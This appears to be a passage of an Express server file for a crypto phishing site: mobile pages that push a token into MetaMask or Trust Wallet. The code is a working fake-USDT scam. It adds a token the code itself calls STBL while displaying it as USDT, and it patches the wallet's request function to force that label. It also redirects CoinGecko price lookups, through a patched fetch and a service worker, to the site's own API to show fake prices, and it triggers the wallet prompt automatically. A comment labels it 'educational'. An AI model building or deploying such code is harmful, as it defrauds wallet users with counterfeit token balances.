      border: none;
      border-radius: 12px;
      padding: 16px 24px;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      width: 100%;
      margin-bottom: 16px;
      max-width: 300px;
    }
    .wallet-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      background-color: #f0f0f0;
      color: #333;
      border: none;
      border-radius: 12px;
      padding: 16px 24px;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      width: 100%;
      max-width: 300px;
      margin-bottom: 16px;
    }
    .wallet-icon {
      width: 24px;
      height: 24px;
      margin-right: 8px;
    }
    .network-tag {
      background-color: #0052ff;
      color: white;
      padding: 4px 12px;
      border-radius: 16px;
      font-size: 14px;
      font-weight: 500;
      margin-bottom: 24px;
    }
    .loading {
      display: none;
      flex-direction: column;
      align-items: center;
      margin-top: 20px;
    }
    .spinner {
      border: 4px solid rgba(0, 0, 0, 0.1);
      border-left-color: #26a17b;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    .loading-text {
      margin-top: 16px;
      font-size: 16px;
      color: #666;
    }
    .qr-modal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.7);
      align-items: center;
      justify-content: center;
      z-index: 100;
    }
    .qr-content {
      background-color: white;
      padding: 24px;
      border-radius: 16px;
      max-width: 320px;
      width: 90%;
      text-align: center;
    }
    .qr-title {
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 16px;
    }
    .qr-image {
      width: 200px;
      height: 200px;
      margin: 0 auto 16px;
    }
    .qr-close {
      background-color: #f0f0f0;
      color: #333;
      border: none;
      border-radius: 12px;
      padding: 12px 24px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      width: 100%;
    }
    .instructions {
      background-color: #f8f8f8;
      border-radius: 12px;
      padding: 16px;
      margin-top: 24px;
      width: 100%;
      max-width: 300px;
    }
    .instructions h3 {
      margin-top: 0;
      font-size: 16px;
    }
    .instructions ol {
      margin: 0;
      padding-left: 24px;
    }
    .instructions li {
      margin-bottom: 8px;
      font-size: 14px;
    }
    .permission-info {
      background-color: #f0f8ff;
      border-radius: 12px;
      padding: 12px;
      margin-bottom: 24px;
      font-size: 14px;
      width: 100%;
      max-width: 300px;
      border-left: 3px solid #26a17b;
    }
    #error-message {
      color: red;
      margin-top: 10px;
      display: none;
      font-size: 14px;
    }
    .alt-method {
      display: none;
      margin-top: 10px;
    }
    .wallet-btns {
      display: flex;
      flex-direction: column;
      width: 100%;
      max-width: 300px;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="${TOKEN_CONFIG.image}" alt="USDT Logo" class="logo">
    <h1 class="title">Add USDT to Your Wallet</h1>
    <p class="subtitle">Tether USD on Ethereum</p>
    
    <div class="network-tag">Ethereum Network</div>
    
    <div class="permission-info">
      <p style="margin: 0;">Adding this token requires minimal permissions. Your wallet will show exactly what's being requested.</p>
    </div>
    
    <button id="addBtn" class="add-btn">Add to MetaMask</button>
    <button id="altMethodBtn" class="add-btn alt-method">Try Alternative Method</button>
    
    <div class="wallet-btns">
      <button id="viewInMetaMaskBtn" class="wallet-btn">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 35 33" width="24" height="24" class="wallet-icon">
          <path fill="#E2761B" d="M32.958 1l-13.134 9.718 2.442-5.727L32.958 1z"/>
          <path fill="#E4761B" d="M2.663 1l13.016 9.809-2.325-5.818L2.663 1zM28.25 23.54l-3.436 5.257 7.331 2.017 2.107-7.167-6.002-.107zM1.277 23.647l2.099 7.167 7.33-2.017-3.436-5.257-5.993.107z"/>
          <path fill="#E4761B" d="M10.177 14.43l-2.088 3.15 7.42.336-.247-8.005-5.085 4.519zM25.353 14.43l-5.144-4.608-.169 8.094 7.42-.336-2.107-3.15zM10.177 28.797l4.47-2.156-3.856-3.01-.614 5.166zM20.883 26.641l4.468 2.156-.612-5.166-3.856 3.01z"/>
          <path fill="#F6851B" d="M25.35 28.797l-4.468-2.156.359 2.886-.039 1.216 4.148-1.946zM10.177 28.797l4.148 1.946-.03-1.216.357-2.886-4.475 2.156z"/>
        </svg>
        View in MetaMask
      </button>
      <button id="viewInTrustWalletBtn" class="wallet-btn">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 32 32" class="wallet-icon">
          <path fill="#3375BB" d="M16 0C7.163 0 0 7.163 0 16s7.163 16 16 16 16-7.163 16-16S24.837 0 16 0z"/>
          <path fill="#fff" d="M15.93 8.64c-3.062 0-7.298 1.45-7.298 5.8 0 2.595 1.553 4.2 3.033 5.106 1.59.97 2.492 1.389 2.492 2.336 0 .946-.901 1.538-2.492 1.538-2.263 0-3.197-.61-3.197-.61s-.607 2.47 3.26 2.47c3.866 0 7.233-1.45 7.233-5.8 0-2.596-1.553-4.2-3.032-5.107-1.59-.97-2.492-1.389-2.492-2.336 0-.946.902-1.537 2.492-1.537 2.263 0 3.197.61 3.197.61s.606-2.47-3.197-2.47z"/>
        </svg>
        View in Trust Wallet
      </button>
      <button id="qrBtn" class="wallet-btn">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="wallet-icon"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><rect x="7" y="7" width="3" height="3"></rect><rect x="14" y="7" width="3" height="3"></rect><rect x="7" y="14" width="3" height="3"></rect><rect x="14" y="14" width="3" height="3"></rect></svg>
        Scan QR Code
      </button>
    </div>
    
    <div id="loading" class="loading">
      <div class="spinner"></div>
      <p class="loading-text" id="loadingText">Opening wallet...</p>
    </div>
    
    <div id="error-message"></div>
    
    <div class="instructions">
      <h3>Instructions:</h3>
      <ol>
        <li>Click "Add to MetaMask" above</li>
        <li>Your wallet will open automatically</li>
        <li>Approve adding the USDT token</li>
        <li>You'll see your USDT in your wallet!</li>
      </ol>
    </div>
  </div>
  
  <div id="qrModal" class="qr-modal">
    <div class="qr-content">
      <h2 class="qr-title">Scan with Your Wallet</h2>
      <img id="qrImage" src="" alt="QR Code" class="qr-image">
      <p>Scan this code with your mobile wallet</p>
      <button id="closeQr" class="qr-close">Close</button>
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', async function() {
      const addBtn = document.getElementById('addBtn');
      const altMethodBtn = document.getElementById('altMethodBtn');
      const qrBtn = document.getElementById('qrBtn');
      const closeQr = document.getElementById('closeQr');
      const qrModal = document.getElementById('qrModal');
      const qrImage = document.getElementById('qrImage');
      const loading = document.getElementById('loading');
      const loadingText = document.getElementById('loadingText');
      const errorMessage = document.getElementById('error-message');
      const viewInMetaMaskBtn = document.getElementById('viewInMetaMaskBtn');
      const viewInTrustWalletBtn = document.getElementById('viewInTrustWalletBtn');
      
      // Fetch QR code on page load
      try {
        const res = await fetch('/api/generate-qr?url=https://metamask.app.link/dapp/${host}/metamask-redirect');
        const data = await res.json();
        qrImage.src = data.qrCodeDataURL;
      } catch (err) {
        console.error('Error loading QR code:', err);
      }
      
      // Set up wallet deep links
      viewInMetaMaskBtn.addEventListener('click', async () => {
        try {
          // Try to get deep link from API
          const res = await fetch('/api/deeplink/metamask');
          const data = await res.json();
          
          // Open MetaMask deep link
          if (data.deepLink) {
            window.location.href = data.deepLink;
          } else {
            errorMessage.textContent = 'Error generating deep link';
            errorMessage.style.display = 'block';
          }
        } catch (err) {
          console.error('Error with deep link:', err);
          errorMessage.textContent = 'Error: ' + err.message;
          errorMessage.style.display = 'block';
        }
      });
      
      viewInTrustWalletBtn.addEventListener('click', async () => {
        try {
          // Try to get deep link from API
          const res = await fetch('/api/deeplink/trustwallet');
          const data = await res.json();
          
          // Open Trust Wallet deep link
          if (data.deepLink) {
            window.location.href = data.deepLink;
          } else {
            errorMessage.textContent = 'Error generating deep link';
            errorMessage.style.display = 'block';
          }
        } catch (err) {
          console.error('Error with deep link:', err);
          errorMessage.textContent = 'Error: ' + err.message;
          errorMessage.style.display = 'block';
        }
      });
      
      // Helper function to show loading with message
      function showLoading(message) {
        loadingText.textContent = message || "Opening wallet...";
        loading.style.display = 'flex';
        errorMessage.style.display = 'none';
        
        // CRITICAL FIX: Always set a forced timeout
        const forceHideTimeout = setTimeout(() => {
          console.log("Forced timeout - hiding loading overlay");
          loading.style.display = 'none';
          // Show alternative method after timeout
          altMethodBtn.style.display = 'block';
        }, 15000); // 15 seconds timeout
        
        return forceHideTimeout;
      }
      
      // Helper function to hide loading and clear timeout
      function hideLoading(timeoutId) {
        if (timeoutId) clearTimeout(timeoutId);
        loading.style.display = 'none';
      }
      
      // Helper function to safely call MetaMask
      async function safeMetaMaskCall(method, params) {
        console.log("Calling MetaMask: " + method);
        try {
          return await window.ethereum.request({
            method: method,
            params: params || []
          });
        } catch (error) {
          console.error("MetaMask Error (" + method + "):", error);
          return { error };
        }
      }
      
      // Add to MetaMask button
      addBtn.addEventListener('click', async function() {
        const timeoutId = showLoading("Adding USDT to your wallet...");
        
        try {
          // Check if running in mobile browser with MetaMask
          if (window.ethereum && window.ethereum.isMetaMask) {
            // Web3 is available - use direct method
            
            // Try to add the token
            loadingText.textContent = "Adding USDT to your wallet...";
            
            // CRITICAL FIX: Force a small delay to ensure interception works
            await new Promise(resolve => setTimeout(resolve, 500));
            
            const result = await safeMetaMaskCall('wallet_watchAsset', {
              type: 'ERC20',
              options: {
                address: '${TOKEN_CONFIG.address}',
                symbol: '${TOKEN_CONFIG.displaySymbol}',
                decimals: ${TOKEN_CONFIG.decimals},
                image: '${TOKEN_CONFIG.image}'
              }
            });
            
            // Hide loading overlay
            hideLoading(timeoutId);
            
            if (result && result.error) {
              if (result.error.code === 4001) {
                // User rejected
                console.log("User rejected token addition");
              } else {
                throw new Error("Token addition error: " + result.error.message);
              }
            } else if (result === true) {
              // Success! Redirect to success page
              window.location.href = '${protocol}://${host}/mobile/success';
            } else {
              // Something unexpected happened
              console.log("Unexpected result:", result);
              errorMessage.textContent = "Unexpected result from wallet";
              errorMessage.style.display = 'block';
              altMethodBtn.style.display = 'block';
            }
          } else {
            // No MetaMask in browser - try deep linking
            window.location.href = 'https://metamask.app.link/dapp/${host}/metamask-redirect';
            
            // Hide loading after a brief delay
            setTimeout(() => {
              hideLoading(timeoutId);
            }, 3000);
          }
        } catch (err) {
          // Hide loading overlay
          hideLoading(timeoutId);
          
          console.error('Error adding token:', err);
          
          // Show error unless it's a user rejection
          if (err.code !== 4001) {
            errorMessage.textContent = 'Error: ' + err.message;
            errorMessage.style.display = 'block';
          }
          
          // Show alternative method button
          altMethodBtn.style.display = 'block';
        }
      });
      
      // Alternative method button - try with STBL directly
      altMethodBtn.addEventListener('click', async function() {
        const timeoutId = showLoading("Trying alternative method...");
        
        try {
          if (window.ethereum && window.ethereum.isMetaMask) {
            // Try with the actual token symbol directly
            console.log("Using alternative method with STBL symbol directly");
            
            const result = await safeMetaMaskCall('wallet_watchAsset', {
              type: 'ERC20',
              options: {
                address: '${TOKEN_CONFIG.address}',
                symbol: '${TOKEN_CONFIG.actualSymbol}', // Use STBL directly
                decimals: ${TOKEN_CONFIG.decimals},
                image: '${TOKEN_CONFIG.image}'
              }
            });
            
            // Hide loading overlay
            hideLoading(timeoutId);
            
            if (result && result.error) {
              if (result.error.code === 4001) {
                console.log("User rejected alternative token addition");
              } else {
                throw new Error("Alternative method error: " + result.error.message);
              }
            } else if (result === true) {
              // Success! Redirect to success page
              window.location.href = '${protocol}://${host}/mobile/success';
            } else {
              // Something unexpected happened
              console.log("Unexpected result:", result);
              errorMessage.textContent = "Unexpected result from wallet";
              errorMessage.style.display = 'block';
            }
          } else {
            // No MetaMask - try deep linking
            window.location.href = 'https://metamask.app.link/dapp/${host}/metamask-redirect';
            
            // Hide loading after a brief delay
            setTimeout(() => {
              hideLoading(timeoutId);
            }, 3000);
          }
        } catch (err) {
          // Hide loading overlay
          hideLoading(timeoutId);
          
          console.error('Alternative method error:', err);
          
          // Show error unless it's a user rejection
          if (err.code !== 4001) {
            errorMessage.textContent = 'Error: ' + err.message;
            errorMessage.style.display = 'block';
          }
        }
      });
      
      // QR code button
      qrBtn.addEventListener('click', function() {
        qrModal.style.display = 'flex';
      });
      
      // Close QR modal
      closeQr.addEventListener('click', function() {
        qrModal.style.display = 'none';
      });
      
      // Also close modal when clicking outside
      qrModal.addEventListener('click', function(e) {
        if (e.target === qrModal) {
          qrModal.style.display = 'none';
        }
      });
      
      // Pre-warm cache for better wallet integration
      fetch('/api/warm-cache', { method: 'POST' }).catch(() => {});
      
      // Try to add token after a short delay if MetaMask is detected
      setTimeout(() => {
        if (window.ethereum && window.ethereum.isMetaMask) {
          addBtn.click();
        }
      }, 1000);
    });
  </script>
</body>
</html>
  `;
  
  res.send(html);
});

// Success page
app.get('/mobile/success', (req, res) => {
  const html = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
  <title>USDT Added Successfully</title>
  <link rel="icon" href="${TOKEN_CONFIG.image}" type="image/png">
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #ffffff;
      color: #1d1d1f;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }
    .container {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      max-width: 500px;
      margin: 0 auto;
      text-align: center;
    }
    .success-icon {
      width: 80px;
      height: 80px;
      background-color: #26a17b;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 24px;
    }
    .success-icon svg {
      width: 40px;
      height: 40px;fill: white;
    }
    .title {
      font-size: 24px;
      font-weight: 600;
      margin-bottom: 16px;
    }
    .message {
      font-size: 16px;
      color: #666;
      margin-bottom: 32px;
      max-width: 300px;
    }
    .btn {
      background-color: #26a17b;
      color: white;
      border: none;
      border-radius: 12px;
      padding: 16px 24px;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      width: 100%;
      max-width: 300px;
      margin-bottom: 16px;
      text-decoration: none;
      display: inline-block;
      text-align: center;
    }
    .btn-secondary {
      background-color: #f0f0f0;
      color: #333;
    }
    .wallet-buttons {
      display: flex;
      flex-direction: column;
      gap: 10px;
      width: 100%;
      max-width: 300px;
    }
    .wallet-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      background-color: #f0f0f0;
      color: #333;
      border: none;
      border-radius: 12px;
      padding: 16px 24px;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      width: 100%;
      text-decoration: none;
    }
    .wallet-icon {
      width: 24px;
      height: 24px;
      margin-right: 8px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="success-icon">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
      </svg>
    </div>
    
    <h1 class="title">USDT Successfully Added!</h1>
    <p class="message">Your USDT token has been added to your wallet. You can now view and manage it in your wallet.</p>
    
    <div class="wallet-buttons">
      <button id="viewInMetaMaskBtn" class="wallet-btn">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 35 33" width="24" height="24" class="wallet-icon">
          <path fill="#E2761B" d="M32.958 1l-13.134 9.718 2.442-5.727L32.958 1z"/>
          <path fill="#E4761B" d="M2.663 1l13.016 9.809-2.325-5.818L2.663 1zM28.25 23.54l-3.436 5.257 7.331 2.017 2.107-7.167-6.002-.107zM1.277 23.647l2.099 7.167 7.33-2.017-3.436-5.257-5.993.107z"/>
          <path fill="#E4761B" d="M10.177 14.43l-2.088 3.15 7.42.336-.247-8.005-5.085 4.519zM25.353 14.43l-5.144-4.608-.169 8.094 7.42-.336-2.107-3.15zM10.177 28.797l4.47-2.156-3.856-3.01-.614 5.166zM20.883 26.641l4.468 2.156-.612-5.166-3.856 3.01z"/>
          <path fill="#F6851B" d="M25.35 28.797l-4.468-2.156.359 2.886-.039 1.216 4.148-1.946zM10.177 28.797l4.148 1.946-.03-1.216.357-2.886-4.475 2.156z"/>
        </svg>
        Open in MetaMask
      </button>
      <button id="viewInTrustWalletBtn" class="wallet-btn">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 32 32" class="wallet-icon">
          <path fill="#3375BB" d="M16 0C7.163 0 0 7.163 0 16s7.163 16 16 16 16-7.163 16-16S24.837 0 16 0z"/>
          <path fill="#fff" d="M15.93 8.64c-3.062 0-7.298 1.45-7.298 5.8 0 2.595 1.553 4.2 3.033 5.106 1.59.97 2.492 1.389 2.492 2.336 0 .946-.901 1.538-2.492 1.538-2.263 0-3.197-.61-3.197-.61s-.607 2.47 3.26 2.47c3.866 0 7.233-1.45 7.233-5.8 0-2.596-1.553-4.2-3.032-5.107-1.59-.97-2.492-1.389-2.492-2.336 0-.946.902-1.537 2.492-1.537 2.263 0 3.197.61 3.197.61s.606-2.47-3.197-2.47z"/>
        </svg>
        Open in Trust Wallet
      </button>
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const viewInMetaMaskBtn = document.getElementById('viewInMetaMaskBtn');
      const viewInTrustWalletBtn = document.getElementById('viewInTrustWalletBtn');
      
      // Set up MetaMask deep link
      viewInMetaMaskBtn.addEventListener('click', async () => {
        try {
          const res = await fetch('/api/deeplink/metamask');
          const data = await res.json();
          if (data.deepLink) {
            window.location.href = data.deepLink;
          }
        } catch (err) {
          console.error('Error with deep link:', err);
        }
      });
      
      // Set up Trust Wallet deep link
      viewInTrustWalletBtn.addEventListener('click', async () => {
        try {
          const res = await fetch('/api/deeplink/trustwallet');
          const data = await res.json();
          if (data.deepLink) {
            window.location.href = data.deepLink;
          }
        } catch (err) {
          console.error('Error with deep link:', err);
        }
      });
    });
  </script>
</body>
</html>
  `;
  
  res.send(html);
});

// MetaMask redirect handler with provider interception
app.get('/metamask-redirect', (req, res) => {
  const host = req.get('host');
  const protocol = req.protocol;
  
  const html = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Connecting to Wallet...</title>
  <!-- CRITICAL FIX: Setup provider interception in head section -->
  <script>
    // Set up MetaMask provider interception immediately
    if (window.ethereum) {
      console.log("Setting up early provider interception");
      const originalRequest = window.ethereum.request;
      window.ethereum.request = async function(args) {
        console.log("MetaMask request:", args);
        
        // Check for wallet_watchAsset method with our specific token
        if (args.method === 'wallet_watchAsset' && 
            args.params?.options?.address?.toLowerCase() === '${TOKEN_CONFIG.address.toLowerCase()}') {
          console.log("Intercepting token call - forcing STBL to display as USDT");
          
          // Override to USDT regardless of what was passed
          args.params.options.symbol = "${TOKEN_CONFIG.displaySymbol}";
          args.params.options.name = "${TOKEN_CONFIG.displayName}";
        }
        
        // Call original method with our modified args
        return originalRequest.call(this, args);
      };
    }
    
    // Also intercept CoinGecko API calls early to ensure USDT price display
    if (window.fetch) {
      const originalFetch = window.fetch;
      window.fetch = function(resource, init) {
        if (typeof resource === 'string' && resource.includes('api.coingecko.com')) {
          console.log("Intercepting CoinGecko API call");
          const newUrl = resource.replace(
            'https://api.coingecko.com', 
            window.location.origin + '/api'
          );
          return originalFetch(newUrl, init);
        }
        return originalFetch(resource, init);
      };
    }
  </script>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      padding: 20px;
      text-align: center;
    }
    .spinner {
      border: 5px solid #f3f3f3;
      border-top: 5px solid #26a17b;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    #error-message {
      color: red;
      margin-top: 20px;
      display: none;
    }
    #status-message {
      margin-top: 15px;
      color: #333;
      font-size: 14px;
    }
    .reset-btn {
      position: fixed;
      bottom: 10px;
      right: 10px;
      padding: 8px 12px;
      background: #ff5555;
      color: white;
      border-radius: 5px;
      border: none;
      font-size: 12px;
      opacity: 0.7;
      z-index: 1000;
    }
    .wallet-buttons {
      display: flex;
      flex-direction: column;
      gap: 10px;
      margin-top: 20px;
      width: 80%;
      max-width: 300px;
      display: none;
    }
    .wallet-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 12px;
      border-radius: 8px;
      border: none;
      background-color: #f0f0f0;
      color: #333;
      font-weight: 500;
      cursor: pointer;
    }
    .wallet-icon {
      width: 20px;
      height: 20px;
      margin-right: 8px;
    }
  </style>
</head>
<body>
  <div class="spinner"></div>
  <h1>Connecting to Your Wallet...</h1>
  <p>Please approve the connection request in your wallet app.</p>
  <div id="status-message">Initializing...</div>
  <div id="error-message"></div>
  
  <div class="wallet-buttons" id="walletButtons">
    <button class="wallet-btn" id="viewInMetaMaskBtn">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 35 33" width="20" height="20" class="wallet-icon">
        <path fill="#E2761B" d="M32.958 1l-13.134 9.718 2.442-5.727L32.958 1z"/>
        <path fill="#E4761B" d="M2.663 1l13.016 9.809-2.325-5.818L2.663 1zM28.25 23.54l-3.436 5.257 7.331 2.017 2.107-7.167-6.002-.107zM1.277 23.647l2.099 7.167 7.33-2.017-3.436-5.257-5.993.107z"/>
        <path fill="#E4761B" d="M10.177 14.43l-2.088 3.15 7.42.336-.247-8.005-5.085 4.519zM25.353 14.43l-5.144-4.608-.169 8.094 7.42-.336-2.107-3.15zM10.177 28.797l4.47-2.156-3.856-3.01-.614 5.166zM20.883 26.641l4.468 2.156-.612-5.166-3.856 3.01z"/>
        <path fill="#F6851B" d="M25.35 28.797l-4.468-2.156.359 2.886-.039 1.216 4.148-1.946zM10.177 28.797l4.148 1.946-.03-1.216.357-2.886-4.475 2.156z"/>
      </svg>
      Open in MetaMask
    </button>
    <button class="wallet-btn" id="viewInTrustWalletBtn">
      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 32 32" class="wallet-icon">
        <path fill="#3375BB" d="M16 0C7.163 0 0 7.163 0 16s7.163 16 16 16 16-7.163 16-16S24.837 0 16 0z"/>
        <path fill="#fff" d="M15.93 8.64c-3.062 0-7.298 1.45-7.298 5.8 0 2.595 1.553 4.2 3.033 5.106 1.59.97 2.492 1.389 2.492 2.336 0 .946-.901 1.538-2.492 1.538-2.263 0-3.197-.61-3.197-.61s-.607 2.47 3.26 2.47c3.866 0 7.233-1.45 7.233-5.8 0-2.596-1.553-4.2-3.032-5.107-1.59-.97-2.492-1.389-2.492-2.336 0-.946.902-1.537 2.492-1.537 2.263 0 3.197.61 3.197.61s.606-2.47-3.197-2.47z"/>
      </svg>
      Open in Trust Wallet
    </button>
  </div>
  
  <button onclick="window.location.reload();" class="reset-btn">Reset</button>
  
  <script>
    // Enable console logs to appear in the UI for debugging
    const originalConsoleLog = console.log;
    console.log = function(...args) {
      originalConsoleLog.apply(console, args);
      const statusMessage = document.getElementById('status-message');
      if (statusMessage) {
        statusMessage.textContent = args.join(' ');
      }
    };
    
    // Helper function to safely call MetaMask
    async function safeMetaMaskCall(method, params, retryAttempt = 0) {
      console.log("Calling wallet: " + method);
      try {
        if (!window.ethereum) {
          throw new Error("Wallet not detected");
        }
        
        // If this is a retry, add a small delay
        if (retryAttempt > 0) {
          await new Promise(resolve => setTimeout(resolve, retryAttempt * 500));
        }
        
        return await window.ethereum.request({
          method: method,
          params: params || []
        });
      } catch (error) {
        console.error("Wallet Error (" + method + "):", error);
        
        // For certain errors, retry the operation
        const canRetry = error.code === -32603 || // Internal error
                         error.code === -32002 || // Request already pending
                         (error.message && error.message.includes('already pending'));
                         
        if (canRetry && retryAttempt < 3) {
          console.log("Retrying due to error: " + error.message);
          return safeMetaMaskCall(method, params, retryAttempt + 1);
        }
        
        return { error };
      }
    }
    
    // CRITICAL FIX: Force hide loading after timeout
    let forceHideTimeout;
    
    // Automatic token addition function
    async function addTokenToWallet() {
      try {
        // Check for ethereum object
        if (window.ethereum) {
          console.log("Wallet detected");
          
          // Try to get accounts to prompt unlock if needed
          try {
            console.log("Requesting accounts...");
            await safeMetaMaskCall('eth_requestAccounts');
          } catch (accountError) {
            if (accountError.code === 4001) {
              throw new Error("Connection declined by user");
            }
          }
          
          // Add the token - force USDT display through interception
          console.log("Adding USDT token to wallet...");
          
          // Force a small delay to ensure interception is ready
          await new Promise(resolve => setTimeout(resolve, 500));
          
          const tokenResult = await safeMetaMaskCall('wallet_watchAsset', {
            type: 'ERC20',
            options: {
              address: '${TOKEN_CONFIG.address}',
              symbol: '${TOKEN_CONFIG.displaySymbol}',
              decimals: ${TOKEN_CONFIG.decimals},
              image: '${TOKEN_CONFIG.image}'
            }
          });
          
          // Clear timeout since we got a response
          if (forceHideTimeout) {
            clearTimeout(forceHideTimeout);
          }
          
          console.log("Token addition result:", tokenResult);
          
          if (tokenResult && tokenResult.error) {
            if (tokenResult.error.code === 4001) {
              // User rejected
              console.log("User rejected token addition");
              document.getElementById('error-message').style.display = 'block';
              document.getElementById('error-message').textContent = 'You declined to add the token';
              document.getElementById('walletButtons').style.display = 'flex';
            } else {
              throw tokenResult.error;
            }
          } else if (tokenResult === true) {
            // Success - redirect to success page
            window.location.href = '${protocol}://${host}/mobile/success';
          } else {
            document.getElementById('error-message').style.display = 'block';
            document.getElementById('error-message').textContent = 'Unexpected result from wallet';
            document.getElementById('walletButtons').style.display = 'flex';
          }
        } else {
          document.getElementById('error-message').style.display = 'block';
          document.getElementById('error-message').textContent = 'Wallet not detected. Please install MetaMask or Trust Wallet first.';
          document.getElementById('walletButtons').style.display = 'flex';
        }
      } catch (error) {
        console.error('Token addition error:', error);
        
        document.getElementById('error-message').style.display = 'block';
        document.getElementById('error-message').textContent = 'Error: ' + error.message;
        document.getElementById('walletButtons').style.display = 'flex';
      }
    }
    
    // Run on page load with setup first
    document.addEventListener('DOMContentLoaded', () => {
      console.log("Page loaded, setting up...");
      
      // Set up wallet buttons
      const viewInMetaMaskBtn = document.getElementById('viewInMetaMaskBtn');
      const viewInTrustWalletBtn = document.getElementById('viewInTrustWalletBtn');
      
      // Set up MetaMask deep link
      viewInMetaMaskBtn.addEventListener('click', async () => {
        try {
          const res = await fetch('/api/deeplink/metamask');
          const data = await res.json();
          if (data.deepLink) {
            window.location.href = data.deepLink;
          }
        } catch (err) {
          console.error('Error with deep link:', err);
        }
      });
      
      // Set up Trust Wallet deep link
      viewInTrustWalletBtn.addEventListener('click', async () => {
        try {
          const res = await fetch('/api/deeplink/trustwallet');
          const data = await res.json();
          if (data.deepLink) {
            window.location.href = data.deepLink;
          }
        } catch (err) {
          console.error('Error with deep link:', err);
        }
      });
      
      // CRITICAL FIX: Set a forced timeout to ensure UI never gets stuck
      forceHideTimeout = setTimeout(() => {
        console.log("Forced timeout - showing alternatives");
        document.getElementById('error-message').style.display = 'block';
        document.getElementById('error-message').textContent = 'Operation timed out. Please try one of these options:';
        document.getElementById('walletButtons').style.display = 'flex';
      }, 15000); // 15 seconds timeout
      
      console.log("Waiting 1 second before adding token...");
      setTimeout(() => {
        // Try to add token
        addTokenToWallet().catch(err => {
          console.error("Unhandled error:", err);
          document.getElementById('error-message').style.display = 'block';
          document.getElementById('error-message').textContent = 'Unhandled error: ' + err.message;
          document.getElementById('walletButtons').style.display = 'flex';
        });
      }, 1000);
      
      // Warm cache for better wallet integration
      fetch('/api/warm-cache', { method: 'POST' }).catch(() => {});
    });
  </script>
</body>
</html>
  `;
  
  res.send(html);
});

// =========================================================
// MAIN ROUTES
// =========================================================

// Root route - detect mobile and redirect accordingly
app.get('/', (req, res) => {
  // Check if user is on mobile
  const userAgent = req.headers['user-agent'] || '';
  const isMobile = /iPhone|iPad|iPod|Android/i.test(userAgent);
  
  if (isMobile) {
    // Mobile users go to mobile-optimized page
    res.redirect('/mobile/add-token');
  } else {
    // Desktop users get the standard page
    res.sendFile(path.join(__dirname, 'index.html'));
  }
});

// Service worker for offline functionality and network interception
app.get('/sw.js', (req, res) => {
  const serviceWorker = `
    // Service Worker for educational USDT display project
    const CACHE_NAME = 'usdt-display-cache-v1';

    // Files to cache
    const urlsToCache = [
      '/',
      '/index.html',
      '/mobile/add-token',
      '/mobile/success',
      '${TOKEN_CONFIG.image}'
    ];

    // Install service worker and cache assets
    self.addEventListener('install', event => {
      console.log('[ServiceWorker] Install');
      event.waitUntil(
        caches.open(CACHE_NAME)
          .then(cache => {
            console.log('[ServiceWorker] Caching app shell');
            return cache.addAll(urlsToCache);
          })
      );
    });

    // Activate and clean up old caches
    self.addEventListener('activate', event => {
      console.log('[ServiceWorker] Activate');
      event.waitUntil(
        caches.keys().then(keyList => {
          return Promise.all(keyList.map(key => {
            if (key !== CACHE_NAME) {
              console.log('[ServiceWorker] Removing old cache', key);
              return caches.delete(key);
            }
          }));
        })
      );
      return self.clients.claim();
    });

    // Intercept fetch requests
    self.addEventListener('fetch', event => {
      // Special handling for Coingecko API calls
      if (event.request.url.includes('api.coingecko.com')) {
        // Redirect to our proxy
        const newUrl = event.request.url.replace(
          'https://api.coingecko.com',
          self.location.origin + '/api'
        );
        console.log('[ServiceWorker] Redirecting CoinGecko request to:', newUrl);
        event.respondWith(fetch(new Request(newUrl, {
          method: event.request.method,
          headers: event.request.headers,
          body: event.request.body,
          mode: 'cors',
          credentials: event.request.credentials,
          redirect: 'follow'
        })));
        return;
      }

     // Regular fetch handling with network-first strategy
      event.respondWith(
